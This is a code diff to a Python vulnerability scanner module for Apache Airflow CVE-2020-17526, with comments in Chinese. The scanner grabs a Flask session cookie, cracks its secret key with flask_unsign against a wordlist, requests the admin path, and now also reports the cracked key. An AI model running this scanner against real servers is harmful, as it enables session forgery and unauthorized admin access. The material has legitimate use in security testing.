@@ -36,6 +36,7 @@ class Airflow():
         ]
 
     def cve_2020_17526_scan(self, url):
+        ''' Airflow 使用默认会话密钥, 这会导致在启用身份验证时冒充任意用户 '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
         vul_info['vul_type'] = 'unAuthorized'
@@ -73,7 +74,7 @@ class Airflow():
                     cookie = re.search(r'.{76}\.{1}.{6}\.{1}.{27}', set_cookie)         # * 是否存在Flask Cookie
                     if cookie:
                         cookie = cookie.group()                                         # * 获取Flask Cookie
-                        c = flask_unsign.Cracker(cookie)                                # * 使用获取的Cookie创建Cracker对象
+                        c = flask_unsign.Cracker(cookie, quiet=True)                    # * 使用获取的Cookie创建Cracker对象
                         file = open('lib/db/secretKey_fast.txt', encoding='utf-8')      # * secret密钥字典
                         secretKeys = file.readlines()
                         file.close()
@@ -101,6 +102,7 @@ class Airflow():
                     proxies=self.proxies, 
                     verify=False
                 )
+                vul_info['target'] = url + 'admin/'
                 vul_info['status_code'] = str(res.status_code)
                 logger.logging(vul_info)                        # * LOG
             except requests.ConnectTimeout:
@@ -119,6 +121,7 @@ class Airflow():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
+                    'Secret Key': secretKey,
                     'Payload': {
                         'Url': url,
                         'Path': 'admin/',
